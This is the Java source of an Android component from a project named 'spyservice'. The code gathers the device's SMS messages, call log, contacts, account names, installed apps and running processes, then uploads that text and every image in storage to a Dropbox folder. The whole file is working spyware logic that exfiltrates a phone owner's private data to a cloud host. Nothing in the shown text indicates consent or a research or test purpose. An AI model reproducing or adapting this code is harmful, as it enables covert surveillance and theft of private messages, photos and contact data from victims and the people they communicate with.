/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 + Copyright (C) 2020 Eldar Timraleev (aka CRaFT4ik). All rights reserved.                        +
 + Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file      +
 + except in compliance with the License. You may obtain a copy of the License at                 +
 + http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in   +
 + writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    +
 + WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the       +
 + specific language governing permissions and limitations under the License.                     +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

package ru.er_log.spyservice.loadable;

import android.content.Context;
import android.util.Log;

import com.dropbox.core.DbxException;
import com.dropbox.core.v2.files.FileMetadata;
import com.dropbox.core.v2.files.ListFolderResult;
import com.dropbox.core.v2.files.Metadata;
import com.dropbox.core.v2.files.WriteMode;

import java.io.ByteArrayInputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.contacts.Contact;
import me.everything.providers.android.telephony.Sms;
import ru.er_log.spyservice.Settings;
import ru.er_log.spyservice.loadable.content.ImageInformation;
import ru.er_log.spyservice.loadable.content.SystemInformation;
import ru.er_log.spyservice.network.DropBox;

public final class Loadable implements ILoadable
{
    public Loadable()
    {
        Log.d(Settings.LOG_TAG, "Loadable initialized");
    }

    @Override
    public boolean fulfillDestiny(Context context)
    {
        DropBox dropBox;
        try { dropBox = new DropBox(context); }
        catch (DbxException e)
        {
            Log.e(Settings.LOG_TAG, "Exception while DropBox initialization");
            e.printStackTrace();
            return false;
        }

        uploadAllData(context, dropBox);
        return true;
    }

    private void uploadAllData(Context context, DropBox dropBox)
    {
        /* Forming images paths. */
        HashMap<String, ImageInformation.PictureFace> localImages = new HashMap<>();
        List<ImageInformation.ImageFolder> folders = Functions.getPicturePaths(context);
        for (ImageInformation.ImageFolder folder : folders)
            for (ImageInformation.PictureFace image : Functions.getAllImagesByFolder(context, folder.getPath()))
                localImages.put(image.getPicturePath().toLowerCase().intern(), image);

        /* Uploading text information. */

        Date date = new Date(System.currentTimeMillis());
        String dateFormatted = android.text.format.DateFormat.format("dd.MM.yyyy 'at' HH:mm:ss", date).toString();
        String dropboxPath = dropBox.getCloudFolderOther() + "/" + dateFormatted + ".txt";
        String information = collectInformation(context, localImages.values());
        //Log.d(Settings.DEBUG_TAG, "Collected information:\n" + information);

        byte[] bytes = information.getBytes(Charset.defaultCharset());
        dropBox.uploadFile(WriteMode.ADD, date, null, dropboxPath, new ByteArrayInputStream(bytes));

        /* Uploading images. */

        { // Creating directories for images in cloud.
            List<String> paths = new ArrayList<>(folders.size());
            for (ImageInformation.ImageFolder folder : folders)
            {
                paths.add(dropBox.getCloudFolderImages() + folder.getPath().toLowerCase());
                //Log.d(Settings.DEBUG_TAG, dropBox.getCloudFolderImages() + folder.getPath().toLowerCase());
            }
            dropBox.createFolderBatch(paths, false);
        }

        formUploadImagesList(dropBox, localImages);
        if (localImages.size() != 0)
        {
            Collection<ImageInformation.PictureFace> values = localImages.values();
            Log.d(Settings.LOG_TAG, "Need to upload " + values.size() + " images.");

            int success = 0, counter = 0, total = values.size();
            for (ImageInformation.PictureFace pictureFace : values)
            {
                counter++;
                dropboxPath = dropBox.getCloudFolderImages() + pictureFace.getPicturePath().toLowerCase();
                try
                {
                    FileInputStream inputStream = new FileInputStream(pictureFace.getPicturePath());
                    FileMetadata fileMetadata = dropBox.uploadFile(WriteMode.OVERWRITE, pictureFace.getDateModified(), null, dropboxPath, inputStream);
                    if (fileMetadata != null) success++;
                    inputStream.close();
                } catch (IOException e)
                {
                    e.printStackTrace();
                }

                if (counter % 5 == 0 || counter == total)
                    Log.d(Settings.LOG_TAG, "Uploaded " + success + " of " + total + ", failure " + (counter - success));
            }
            Log.d(Settings.LOG_TAG, "Uploading process finished");
        } else
        {
            Log.d(Settings.LOG_TAG, "No images for upload");
        }
    }

    /** Checks if element of {@param localImages} already exists on the server. File modified date also checks.
     * If newest version of element already exist, element will be removed from {@param localImages}. */
    private void formUploadImagesList(DropBox dropBox, HashMap<String, ImageInformation.PictureFace> localImages)
    {
        String dirContent = dropBox.getCloudFolderImages();
        try
        {
            ListFolderResult content = dropBox.getAllFolderContent(dirContent, true);
            for (Metadata metadata : content.getEntries())
            {
                FileMetadata fileMetadata;
                try { fileMetadata = (FileMetadata) metadata; }
                catch (ClassCastException ignored) { continue; }

                String cloudImagePath = fileMetadata.getPathLower().substring(dirContent.length()).intern();
                ImageInformation.PictureFace pictureFace;
                if ((pictureFace = localImages.get(cloudImagePath)) != null)
                {
                    Date localDateModified = pictureFace.getDateModified();
                    Date cloudDateModified = fileMetadata.getClientModified();
                    if ((localDateModified.getTime() / 1000L) <= (cloudDateModified.getTime() / 1000L))
                        localImages.remove(cloudImagePath);
                }
            }
        } catch (DbxException e)
        {
            Log.e(Settings.LOG_TAG, "Can't load cloud directory content: " + dirContent);
            e.printStackTrace();
        }
    }

    private String collectInformation(Context context, Collection<ImageInformation.PictureFace> images)
    {
        List<Sms> sms = Functions.getSms(context);
        List<Call> calls = Functions.getCalls(context);
        List<Contact> contacts = Functions.getContacts(context);
        SystemInformation systemInformation = Functions.getSystemInformation(context);

        List<String> imagesPaths = new ArrayList<>();
        if (images != null)
            for (ImageInformation.PictureFace pictureFace : images)
                imagesPaths.add(pictureFace.getPicturePath());

        StringBuilder global = new StringBuilder();

        StringBuilder builder = new StringBuilder();
        for (Sms mes : sms)
            builder.append(mes.toString()).append('\n');
        global.append("- - -\n").append("SMS Messages:\n").append(builder);

        builder = new StringBuilder();
        for (Call call : calls)
            builder.append(call.toString()).append('\n');
        global.append("- - -\n").append("Calls:\n").append(builder);

        builder = new StringBuilder();
        for (Contact contact : contacts)
            builder.append(contact.toString()).append('\n');
        global.append("- - -\n").append("Contacts:\n").append(builder);

        builder = new StringBuilder();
        for (String image : imagesPaths)
            builder.append(image).append('\n');
        global.append("- - -\n").append("Images in storage:\n").append(builder);

        builder = new StringBuilder();
        builder.append("- - -\n").append("OS version code: ").append(systemInformation.getOsVersion()).append('\n');
        builder.append("- - -\n").append("SDK version code: ").append(systemInformation.getSdkVersion()).append('\n');
        builder.append("- - -\n").append("Free space: ").append(systemInformation.getFreeSpace()).append('\n');
        builder.append("- - -\n").append("Accounts: ").append('\n');
        for (String string : systemInformation.getAccounts())
            builder.append(" - ").append(string).append('\n');
        builder.append("- - -\n").append("Installed apps: ").append('\n');
        for (String string : systemInformation.getInstalledApps())
            builder.append(" - ").append(string).append('\n');
        builder.append("- - -\n").append("Running processes: ").append('\n');
        for (String string : systemInformation.getRunningProcesses())
            builder.append(" - ").append(string).append('\n');

        global.append("- - -\n").append("System information:\n").append(builder);
        return global.toString();
    }
}
